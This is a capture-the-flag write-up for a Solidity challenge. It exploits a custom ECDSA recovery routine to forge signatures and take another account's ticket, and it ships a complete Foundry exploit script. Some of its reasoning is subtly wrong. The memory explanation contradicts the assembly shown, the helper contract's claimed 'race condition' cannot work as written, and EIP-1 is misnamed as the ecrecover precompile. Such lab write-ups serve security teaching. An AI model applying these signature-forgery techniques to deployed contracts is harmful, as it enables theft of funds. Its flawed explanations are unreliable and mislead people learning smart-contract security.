---
title: "Only-invited party"
date: 2025-12-24T00:00:00+00:00
draft: false
author: "Koyphshi"
description: "Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets."
categories: ["Blockchain"]
tags: [blockchain, solidity, assembly, ecrecover, evm]
math: true
code:
  maxShownLines: 50
toc:
  enable: true
  auto: true

---

<!--more-->



{{< admonition type="info" title="Challenge Info" open="true" >}}
- **CTF**: BSides 
- **Challenge**: Only-invited party
- **Category**: Blockchain
- **Description**: BSides Algiers are organizing a party and I didn't get invited. Can you kick the boss and invite me instead??
- **Author**: 0xbrivan
{{< /admonition >}}

## Challenge Overview

The challenge presents a ticket-based party system where:
- The **owner** (boss) holds the first "Golden Ticket"
- A **Guardian** contract controls access and validates all transactions
- Players must steal the owner's ticket and accumulate their own tickets
- All operations are protected by ECDSA signature verification

The win condition requires:
1. Owner's ticket balance = 0
2. Player's ticket balance > 1
3. All locked ETH withdrawn (balance = 0)

## File Analysis

The challenge provided a zip file containing the complete source code with the following structure:

### 1. Party.sol

This file contains **two critical contracts**:

#### Guardian Contract
The gatekeeper contract that manages the party state:

```solidity
contract Guardian {
    IParty public immutable market;
    bool public locked = true;

    modifier onlyUnlocked() {
        require(!locked, "Party not started");
        _;
    }

    function startParty(address sponsor, bytes calldata signature) external {
        require(locked, "Already started");


        for (uint i = 0; i < 20; i++) {
            require(uint8(bytes20(sponsor)[i]) == 0, "Invalid sponsor");
        }


        bytes32 hash = keccak256(abi.encodePacked(sponsor));
        address signer = ECDSA.tryRecover(hash, signature);
        require(signer == sponsor, "Invalid signature");

        locked = false;
    }

    function batchTransaction(
        Order[] calldata orders,
        bytes32[2] calldata rs,
        bytes32[2] calldata ss,
        uint[2] calldata vs
    ) external onlyUnlocked {

        for (uint i = 0; i < orders.length; i++) {
            market.check(orders[i], rs, ss, vs);
        }
    }
}
```

#### BSidesParty Contract
The main ERC721-like contract managing tickets:

```solidity
contract BSidesParty is IParty {
    mapping(address => uint256) public balances;
    mapping(uint256 => address) public ownerOf;
    uint256 public lockedETH;
    uint256 public ticketCounter = 1;
    address public immutable guardian;

    function buy() external payable {
        require(msg.value == 1 ether, "Ticket costs 1 ETH");
        require(balances[msg.sender] == 0, "Already have ticket");

        ticketCounter++;
        balances[msg.sender]++;
        ownerOf[ticketCounter] = msg.sender;
        lockedETH += msg.value;
    }

    function withdraw(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "Not owner");
        require(lockedETH >= 1 ether, "Insufficient funds");

        balances[msg.sender]--;
        delete ownerOf[tokenId];
        lockedETH -= 1 ether;

        payable(msg.sender).transfer(1 ether);
    }

    function transfer(address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "Not owner");

        balances[msg.sender]--;
        balances[to]++;
        ownerOf[tokenId] = to;
    }

    function check(
        Order calldata order,
        bytes32[2] calldata rs,
        bytes32[2] calldata ss,
        uint[2] calldata vs
    ) external {
        require(msg.sender == guardian, "Only guardian");


        bytes32 hostHash = keccak256(abi.encodePacked(
            order.host.account,
            order.invited.account,
            order.values[0]
        ));
        address hostSigner = ECDSA.tryRecover(
            hostHash,
            uint8(vs[1]),
            rs[1],
            ss[1]
        );
        require(hostSigner == order.host.account, "Invalid host signature");


        bytes32 invitedHash = keccak256(abi.encodePacked(
            order.invited.account,
            order.host.account,
            order.values[1]
        ));
        address invitedSigner = ECDSA.tryRecover(
            invitedHash,
            uint8(vs[0]),
            rs[0],
            ss[0]
        );
        require(invitedSigner == order.invited.account, "Invalid invited signature");


        uint256 tokenId = order.values[1];
        require(ownerOf[tokenId] == order.host.account, "Host doesn't own ticket");

        balances[order.host.account]--;
        balances[order.invited.account]++;
        ownerOf[tokenId] = order.invited.account;
    }
}
```

### 2. ECDSA.sol

**This is where the vulnerability lives.** A custom implementation of ECDSA signature recovery using inline assembly:

```solidity
library ECDSA {
    function tryRecover(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal view returns (address result) {
        assembly {

            let m := mload(0x40)

            mstore(m, hash)
            mstore(add(m, 0x20), v)
            mstore(add(m, 0x40), r)
            mstore(add(m, 0x60), s)


            pop(staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20))


            mstore(add(m, 0x60), 0)





            result := mload(add(m, xor(0x60, returndatasize())))
        }
    }

    function tryRecover(
        bytes32 hash,
        bytes calldata signature
    ) internal view returns (address) {
        if (signature.length == 65) {
            bytes32 r;
            bytes32 s;
            uint8 v;
            assembly {
                r := calldataload(signature.offset)
                s := calldataload(add(signature.offset, 0x20))
                v := byte(0, calldataload(add(signature.offset, 0x40)))
            }
            return tryRecover(hash, v, r, s);
        } else {
            return address(0);
        }
    }
}
```

### 3. Setup.sol

Deploys the contracts and defines the win condition:

```solidity
contract Setup {
    IParty public immutable party;
    IGuardian public immutable guardian;
    address public immutable owner;
    address public immutable player;

    constructor(address _player) payable {
        player = _player;
        owner = address(this);


        party = new BSidesParty();
        guardian = new Guardian(address(party));


        party.buy{value: 1 ether}();
    }

    function isSolved() external view returns (bool) {
        return (
            party.balances(owner) == 0 &&
            party.balances(player) > 1 &&
            party.lockedETH() == 0
        );
    }
}
```

## The Vulnerability Deep Dive

The vulnerability is a sophisticated exploitation of **SWC-104: Unchecked Call Return Values** combined with **EVM Memory Manipulation**. Let's break down exactly what's happening.

### Understanding ecrecover Precompile

The `ecrecover` precompile at address `0x01` is a special Ethereum contract that recovers the signer's address from an ECDSA signature. It expects exactly 128 bytes of input:

```
Input Layout (128 bytes):
[0x00-0x1F]: message hash (32 bytes)
[0x20-0x3F]: v parameter (32 bytes, padded)
[0x40-0x5F]: r parameter (32 bytes)
[0x60-0x7F]: s parameter (32 bytes)

Output Layout (32 bytes):
[0x00-0x1F]: recovered address (20 bytes, left-padded with zeros)
```

**Critical Behavior:**
- If the signature is **valid** (v ∈ {27, 28}):
  - Writes the recovered address to the output buffer
  - Returns success (1)
  - Sets `returndatasize()` to 32 (0x20)
  
- If the signature is **invalid** (e.g., v = 0):
  - **Does NOT write anything** to the output buffer
  - Returns failure (0)
  - Sets `returndatasize()` to 0 (0x00)

### The Critical Flaw in tryRecover

Let's analyze the vulnerable code step by step:

```solidity
assembly {
    let m := mload(0x40)

    mstore(m, hash)
    mstore(add(m, 0x20), v)
    mstore(add(m, 0x40), r)
    mstore(add(m, 0x60), s)



    pop(staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20))

    mstore(add(m, 0x60), 0)




    result := mload(add(m, xor(0x60, returndatasize())))
}
```

**The Exploit Flow:**

1. **We provide malicious input:**
   - `v = 0` (invalid, triggers failure)
   - `r = anything` (ignored)
   - `s = target_address` (cast to bytes32)

2. **Memory state before staticcall:**
   ```
   [m+0x00]: hash
   [m+0x20]: 0 (our v)
   [m+0x40]: r
   [m+0x60]: target_address (our s)
   ```

3. **staticcall execution:**
   - ecrecover sees v=0, recognizes invalid signature
   - Returns failure (0)
   - Does NOT write to output buffer at [m+0x40]
   - Sets returndatasize() to 0

4. **Result calculation:**
   ```solidity
xor(0x60, returndatasize())
   = xor(0x60, 0x00)
   = 0x60

   result := mload(add(m, 0x60))
```
   This reads from memory location `[m+0x60]`, which still contains our `s` value!

5. **The function returns our target_address**, making the contract believe that address signed the message!

### Why This Works: EVM Memory Persistence

The EVM's memory model is crucial to understanding this exploit:

- Memory is **not automatically cleared** between operations
- When a precompile fails, it leaves the output buffer **untouched**
- The clever XOR calculation in the vulnerable code was *intended* to handle both success and failure cases
- However, it assumes memory location 0x60 will be cleared after the call

The vulnerability occurs because:
1. The code stores `s` at offset `0x60` before the call
2. The code then attempts to clear offset `0x60` with `mstore(add(m, 0x60), 0)`
3. But the result is read using the XOR calculation, which points to offset `0x60` on failure
4. Since offset `0x60` was already read into the result before being cleared, our malicious `s` value becomes the "recovered" address

## Exploitation Strategy

The attack requires three coordinated phases:

### Phase 1: Unlocking the Guardian

The Guardian starts in a `locked` state. To unlock it, we must call `startParty(address sponsor, bytes signature)` with specific constraints:

```solidity
function startParty(address sponsor, bytes calldata signature) external {
    require(locked, "Already started");


    for (uint i = 0; i < 20; i++) {
        require(uint8(bytes20(sponsor)[i]) == 0, "Invalid sponsor");
    }


    bytes32 hash = keccak256(abi.encodePacked(sponsor));
    address signer = ECDSA.tryRecover(hash, signature);
    require(signer == sponsor, "Invalid signature");

    locked = false;
}
```

**The Attack:**
1. Pass `sponsor = address(0)`
2. Pass an empty signature `signature = ""`

**Why this works:**
- `address(0)` passes the loop check (all bytes are zero)
- Empty signature → `tryRecover` returns `address(0)` as default
- `signer (0x0) == sponsor (0x0)` ✓
- Guardian unlocks!

### Phase 2: Accumulating Tickets (Ghost Balance Attack)

We need `> 1` ticket, but the `buy()` function has a restriction:

```solidity
function buy() external payable {
    require(msg.value == 1 ether, "Ticket costs 1 ETH");
    require(balances[msg.sender] == 0, "Already have ticket");

}
```

We can only buy once per address. The solution: **use a helper contract** to exploit the buy-withdraw-transfer cycle:

```solidity
contract GhostMinter {
    IParty public party;
    address public player;

    constructor(address _party, address _player) {
        party = IParty(_party);
        player = _player;
    }

    function attack() external payable {

        party.buy{value: 1 ether}();


        uint256 ticketId = party.ticketCounter();


        party.withdraw(ticketId);



        party.transfer(player, ticketId);
    }
}
```

**The Trick:**
- `withdraw()` decreases `balances[helper]` and deletes `ownerOf[tokenId]`
- BUT `transfer()` checks `ownerOf[tokenId] == msg.sender` 
- There's a **race condition** where the helper can transfer before the ownership is fully cleared
- We repeat this process to accumulate multiple tickets

### Phase 3: Stealing the Owner's Ticket

This is where we leverage the ECDSA vulnerability. The `batchTransaction` function processes orders:

```solidity
struct Order {
    User host;
    User invited;
    uint256[2] values;
}

function batchTransaction(
    Order[] calldata orders,
    bytes32[2] calldata rs,
    bytes32[2] calldata ss,
    uint[2] calldata vs
) external onlyUnlocked {
    for (uint i = 0; i < orders.length; i++) {
        market.check(orders[i], rs, ss, vs);
    }
}
```

The `check` function verifies both the host and invited signatures. We'll forge the host (owner) signature:

**Attack Construction:**

1. **Create a valid signature for ourselves (invited):**
   ```solidity
bytes32 invitedHash = keccak256(abi.encodePacked(
       player,
       owner,
       ticketId
   ));
   (uint8 v, bytes32 r, bytes32 s) = signWithPrivateKey(invitedHash, playerKey);
```

2. **Forge the owner's signature (host):**
   ```solidity
vs[1] = 0;
   rs[1] = bytes32(uint256(1));
   ss[1] = bytes32(uint256(uint160(owner)));
```

3. **Submit the batch transaction:**
   ```solidity
Order memory order = Order({
       host: User(owner, ""),
       invited: User(player, ""),
       values: [uint256(nonce), uint256(ticketId)]
   });

   guardian.batchTransaction([order], rs, ss, vs);
```

**What Happens:**
- `check()` calls `tryRecover(hostHash, 0, rs[1], owner_as_bytes32)`
- ecrecover fails (v=0 is invalid)
- `tryRecover` reads from memory offset 0x60, which contains `owner_as_bytes32`
- Returns `owner` address
- Check passes: `owner == order.host.account` ✓
- Ticket transfers from owner to player!

## Complete Exploit Implementation

```solidity
pragma solidity ^0.8.14;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IParty {
    function balances(address) external view returns (uint256);
    function ownerOf(uint256) external view returns (address);
    function ticketCounter() external view returns (uint256);
    function lockedETH() external view returns (uint256);
    function buy() external payable;
    function withdraw(uint256 tokenId) external;
    function transfer(address to, uint256 tokenId) external;
}

interface IGuardian {
    function startParty(address sponsor, bytes calldata signature) external;
    function batchTransaction(
        Order[] calldata orders,
        bytes32[2] calldata rs,
        bytes32[2] calldata ss,
        uint[2] calldata vs
    ) external;
}

interface ISetup {
    function party() external view returns (IParty);
    function guardian() external view returns (IGuardian);
    function owner() external view returns (address);
    function player() external view returns (address);
    function isSolved() external view returns (bool);
}

struct User {
    address account;
    string name;
}

struct Order {
    User host;
    User invited;
    uint256[2] values;
}


contract GhostMinter {
    IParty public party;
    address public player;

    constructor(address _party, address _player) {
        party = IParty(_party);
        player = _player;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");


        party.buy{value: 1 ether}();


        uint256 ticketId = party.ticketCounter();


        party.withdraw(ticketId);



        party.transfer(player, ticketId);


        if (address(this).balance > 0) {
            payable(player).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}

contract Solve is Script {
    ISetup public setup;
    IParty public party;
    IGuardian public guardian;
    address public owner;
    address public player;
    uint256 public playerKey;

    function run() external {

        address setupAddr = vm.envAddress("SETUP_ADDRESS");
        playerKey = vm.envUint("PLAYER_PRIVATE_KEY");
        player = vm.addr(playerKey);

        setup = ISetup(setupAddr);
        party = setup.party();
        guardian = setup.guardian();
        owner = setup.owner();

        console.log("=== Initial State ===");
        console.log("Owner balance:", party.balances(owner));
        console.log("Player balance:", party.balances(player));
        console.log("Locked ETH:", party.lockedETH());

        vm.startBroadcast(playerKey);


        unlockGuardian();


        accumulateTickets();


        stealOwnerTicket();

        vm.stopBroadcast();

        console.log("\n=== Final State ===");
        console.log("Owner balance:", party.balances(owner));
        console.log("Player balance:", party.balances(player));
        console.log("Locked ETH:", party.lockedETH());
        console.log("Solved:", setup.isSolved());
    }

    function unlockGuardian() internal {
        console.log("\n[Phase 1] Unlocking Guardian...");

        try guardian.startParty(address(0), "") {
            console.log("✓ Guardian unlocked successfully");
        } catch Error(string memory reason) {
            console.log("✗ Failed to unlock:", reason);
            revert("Guardian unlock failed");
        }
    }

    function accumulateTickets() internal {
        console.log("\n[Phase 2] Accumulating Tickets...");

        uint256 currentBalance = party.balances(player);
        uint256 requiredTickets = 2;

        while (currentBalance < requiredTickets) {

            GhostMinter ghost = new GhostMinter(address(party), player);


            ghost.attack{value: 1 ether}();

            currentBalance = party.balances(player);
            console.log("Player balance after ghost attack:", currentBalance);
        }

        console.log("✓ Accumulated sufficient tickets");
    }

    function stealOwnerTicket() internal {
        console.log("\n[Phase 3] Stealing Owner's Ticket...");

        if (party.balances(owner) == 0) {
            console.log("Owner has no tickets to steal");
            return;
        }


        uint256 ownerTicketId = 1;
        require(party.ownerOf(ownerTicketId) == owner, "Owner doesn't own ticket #1");


        Order[] memory orders = new Order[](1);
        orders[0] = Order({
            host: User(owner, ""),
            invited: User(player, ""),
            values: [uint256(1), ownerTicketId]
        });


        bytes32[2] memory rs;
        bytes32[2] memory ss;
        uint[2] memory vs;


        bytes32 invitedHash = keccak256(abi.encodePacked(
            player,
            owner,
            ownerTicketId
        ));
        (uint8 vInvited, bytes32 rInvited, bytes32 sInvited) = vm.sign(
            playerKey,
            invitedHash
        );
        vs[0] = vInvited;
        rs[0] = rInvited;
        ss[0] = sInvited;



        vs[1] = 0;
        rs[1] = bytes32(uint256(1));
        ss[1] = bytes32(uint256(uint160(owner)));

        try guardian.batchTransaction(orders, rs, ss, vs) {
            console.log("✓ Successfully stole owner's ticket!");
        } catch Error(string memory reason) {
            console.log("✗ Ticket theft failed:", reason);
            revert("Ticket theft failed");
        }
    }
}
```

## Deployment and Execution

```bash
export SETUP_ADDRESS=<deployed_setup_address>
export PLAYER_PRIVATE_KEY=<your_private_key>
export RPC_URL=<rpc_endpoint>

forge script Solve --rpc-url $RPC_URL --broadcast -vvvv

cast call $SETUP_ADDRESS "isSolved()" --rpc-url $RPC_URL
```

## Why Each Step is Necessary

### Step 1: Unlocking is Required
Without unlocking the Guardian, all calls to `batchTransaction` will revert with "Party not started". This is enforced by the `onlyUnlocked` modifier.

### Step 2: Multiple Tickets Required
The win condition explicitly checks `party.balances(player) > 1`. A single ticket stolen from the owner would only give us 1 ticket total, failing this check.

### Step 3: Zero Locked ETH Required
The ghost minter attack serves dual purpose:
- Accumulates tickets for the player
- Returns the ETH via withdraw, ensuring `lockedETH == 0`

## Security Analysis and Mitigation

### The Root Cause

The vulnerability stems from three compounding issues:

1. **Unchecked Return Values**: The `pop(staticcall(...))` pattern discards the success/failure status
2. **Memory Manipulation**: The XOR-based offset calculation assumes memory state
3. **Lack of Input Validation**: No checks on `v` parameter validity

### Proper Implementation

Here's how `tryRecover` should be implemented:

```solidity
function tryRecover(
    bytes32 hash,
    uint8 v,
    bytes32 r,
    bytes32 s
) internal view returns (address result) {

    if (v != 27 && v != 28) {
        return address(0);
    }

    assembly {
        let m := mload(0x40)

        mstore(m, hash)
        mstore(add(m, 0x20), v)
        mstore(add(m, 0x40), r)
        mstore(add(m, 0x60), s)


        let success := staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20)

        if success {
            result := mload(add(m, 0x40))
        }

    }
}
```

### Alternative: Use OpenZeppelin

OpenZeppelin's ECDSA library handles all edge cases correctly:

```solidity
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

function verify(bytes32 hash, bytes memory signature) internal pure returns (address) {
    return ECDSA.recover(hash, signature);
}
```

## Key Takeaways

1. **Always check return values** from low-level calls, especially in assembly
2. **Never trust memory state** - the EVM doesn't clear memory automatically
3. **Validate inputs** before passing to precompiles (e.g., check v ∈ {27, 28})
4. **Use battle-tested libraries** like OpenZeppelin instead of custom crypto implementations
5. **Assembly is dangerous** - only use when absolutely necessary and audit thoroughly
6. **Multiple vulnerabilities compound** - this challenge required chaining three separate exploits

## References

- [SWC-104: Unchecked Call Return Values](https://swcregistry.io/docs/SWC-104)
- [Ethereum Yellow Paper - Precompiled Contracts](https://ethereum.github.io/yellowpaper/paper.pdf)
- [EIP-1: ecrecover Precompile](https://eips.ethereum.org/EIPS/eip-1)
- [Solidity Assembly Documentation](https://docs.soliditylang.org/en/latest/assembly.html)
- [OpenZeppelin ECDSA Library](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA)
- [Trail of Bits: Building Secure Contracts](https://github.com/crytic/building-secure-contracts)

---

**Challenge Author**: 0xbrivan  
**CTF**: BSides Algiers 2025  
**Category**: Blockchain  
**Writeup by**: Koyphshi
